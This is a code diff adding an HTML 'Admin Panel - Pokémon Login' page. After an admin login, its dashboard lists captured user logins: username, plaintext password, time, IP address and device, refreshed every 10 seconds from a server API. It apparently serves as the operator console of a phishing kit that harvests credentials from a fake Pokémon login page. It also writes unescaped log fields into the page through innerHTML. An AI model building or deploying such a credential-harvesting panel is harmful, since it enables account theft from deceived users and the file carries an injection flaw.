@@ -1,0 +1,327 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Admin Panel - Pokémon Login</title>
+    <link
+      href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap"
+      rel="stylesheet"
+    />
+    <style>
+      * {
+        margin: 0;
+        padding: 0;
+        box-sizing: border-box;
+        font-family: "Poppins", sans-serif;
+      }
+      body {
+        background-color: #f0f2f5;
+        color: #333;
+      }
+
+      /* Login Screen */
+      #login-screen {
+        height: 100vh;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+      }
+      .login-card {
+        background: white;
+        padding: 40px;
+        border-radius: 8px;
+        box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+        width: 100%;
+        max-width: 400px;
+        text-align: center;
+      }
+      .login-card h2 {
+        margin-bottom: 20px;
+        color: #4dad5b;
+      }
+      .login-card input {
+        width: 100%;
+        padding: 12px;
+        margin-bottom: 15px;
+        border: 1px solid #ddd;
+        border-radius: 4px;
+      }
+      .btn {
+        background-color: #4dad5b;
+        color: white;
+        border: none;
+        padding: 12px 20px;
+        border-radius: 4px;
+        cursor: pointer;
+        font-weight: 600;
+        width: 100%;
+      }
+      .btn:hover {
+        background-color: #369b47;
+      }
+
+      /* Dashboard */
+      #dashboard {
+        display: none;
+        padding: 20px;
+        max-width: 1200px;
+        margin: 0 auto;
+      }
+      .header {
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+        margin-bottom: 20px;
+        background: white;
+        padding: 20px;
+        border-radius: 8px;
+        box-shadow: 0 2px 5px rgba(0, 0, 0, 0.05);
+      }
+      .header h1 {
+        font-size: 24px;
+      }
+      .refresh-btn {
+        background-color: #31a7d9;
+        width: auto;
+        margin-right: 10px;
+      }
+      .logout-btn {
+        background-color: #dc3545;
+        width: auto;
+      }
+
+      /* Table */
+      .table-container {
+        background: white;
+        border-radius: 8px;
+        box-shadow: 0 2px 5px rgba(0, 0, 0, 0.05);
+        overflow-x: auto;
+      }
+      table {
+        width: 100%;
+        border-collapse: collapse;
+        min-width: 600px;
+      }
+      th,
+      td {
+        padding: 15px;
+        text-align: left;
+        border-bottom: 1px solid #eee;
+      }
+      th {
+        background-color: #f8f9fa;
+        font-weight: 600;
+        color: #555;
+      }
+      tr:hover {
+        background-color: #f9f9f9;
+      }
+
+      .username {
+        font-weight: 600;
+        color: #2c3e50;
+      }
+      .password {
+        font-family: monospace;
+        background: #ffeeba;
+        padding: 4px 8px;
+        border-radius: 4px;
+        color: #856404;
+      }
+      .time {
+        color: #666;
+        font-size: 14px;
+      }
+      .ip {
+        font-size: 13px;
+        color: #888;
+      }
+
+      .empty-state {
+        padding: 40px;
+        text-align: center;
+        color: #888;
+      }
+
+      @media (max-width: 768px) {
+        .header {
+          flex-direction: column;
+          gap: 10px;
+          text-align: center;
+        }
+        .header div {
+          display: flex;
+          width: 100%;
+          gap: 10px;
+        }
+        .btn {
+          flex: 1;
+        }
+      }
+    </style>
+  </head>
+  <body>
+    <!-- Login Screen -->
+    <div id="login-screen">
+      <div class="login-card">
+        <h2>🛡️ Admin Panel</h2>
+        <input
+          type="text"
+          id="admin-username"
+          placeholder="Enter Admin Email"
+        />
+        <input
+          type="password"
+          id="admin-password"
+          placeholder="Enter Admin Password"
+        />
+        <button class="btn" onclick="adminLogin()">Login</button>
+        <p
+          id="login-error"
+          style="color: red; margin-top: 10px; font-size: 14px; display: none"
+        >
+          Invalid Password
+        </p>
+      </div>
+    </div>
+
+    <!-- Dashboard -->
+    <div id="dashboard">
+      <div class="header">
+        <h1>📊 User Login Details</h1>
+        <div>
+          <button class="btn refresh-btn" onclick="fetchLogs()">
+            🔄 Refresh
+          </button>
+          <button class="btn logout-btn" onclick="logout()">🚪 Logout</button>
+        </div>
+      </div>
+
+      <div class="table-container">
+        <table id="logs-table">
+          <thead>
+            <tr>
+              <th>User</th>
+              <th>Password</th>
+              <th>Time</th>
+              <th>IP Address</th>
+              <th>Device</th>
+            </tr>
+          </thead>
+          <tbody id="logs-body">
+            <!-- Data will be inserted here -->
+          </tbody>
+        </table>
+        <div id="empty-state" class="empty-state" style="display: none">
+          No login attempts recorded yet.
+        </div>
+      </div>
+    </div>
+
+    <script>
+      const API_URL = "/api/admin";
+      let authToken = localStorage.getItem("adminToken");
+
+      // Check if running on file protocol
+      if (window.location.protocol === "file:") {
+        alert(
+          "⚠️ Please open this page via the server URL:\nhttp://localhost:3000/admin\n\nDirect file access won't work.",
+        );
+      }
+
+      // Check if already logged in
+      if (authToken) {
+        showDashboard();
+      }
+
+      async function adminLogin() {
+        const username = document.getElementById("admin-username").value;
+        const password = document.getElementById("admin-password").value;
+        const errorMsg = document.getElementById("login-error");
+
+        try {
+          const response = await fetch(`${API_URL}/login`, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ username, password }),
+          });
+          const data = await response.json();
+
+          if (data.success) {
+            authToken = data.token;
+            localStorage.setItem("adminToken", authToken);
+            showDashboard();
+            errorMsg.style.display = "none";
+          } else {
+            errorMsg.style.display = "block";
+          }
+        } catch (err) {
+          alert("Server Error");
+        }
+      }
+
+      function showDashboard() {
+        document.getElementById("login-screen").style.display = "none";
+        document.getElementById("dashboard").style.display = "block";
+        fetchLogs();
+
+        // Auto refresh every 10 seconds
+        setInterval(fetchLogs, 10000);
+      }
+
+      function logout() {
+        localStorage.removeItem("adminToken");
+        location.reload();
+      }
+
+      async function fetchLogs() {
+        if (!authToken) return;
+
+        try {
+          const response = await fetch(`${API_URL}/logs`, {
+            headers: { Authorization: `Bearer ${authToken}` },
+          });
+
+          if (response.status === 401) {
+            logout();
+            return;
+          }
+
+          const logs = await response.json();
+          renderLogs(logs);
+        } catch (err) {
+          console.error("Failed to fetch logs", err);
+        }
+      }
+
+      function renderLogs(logs) {
+        const tbody = document.getElementById("logs-body");
+        const emptyState = document.getElementById("empty-state");
+
+        tbody.innerHTML = "";
+
+        if (logs.length === 0) {
+          emptyState.style.display = "block";
+          return;
+        }
+
+        emptyState.style.display = "none";
+
+        logs.forEach((log) => {
+          const date = new Date(log.timestamp).toLocaleString();
+          const row = `
+                    <tr>
+                        <td class="username">👤 ${log.username}</td>
+                        <td><span class="password">${log.password}</span></td>
+                        <td class="time">${date}</td>
+                        <td class="ip">${log.ip}</td>
+                        <td style="font-size: 12px; color: #666;">${log.userAgent}</td>
+                    </tr>
+                `;
+          tbody.innerHTML += row;
+        });
+      }
+    </script>
+  </body>
+</html>
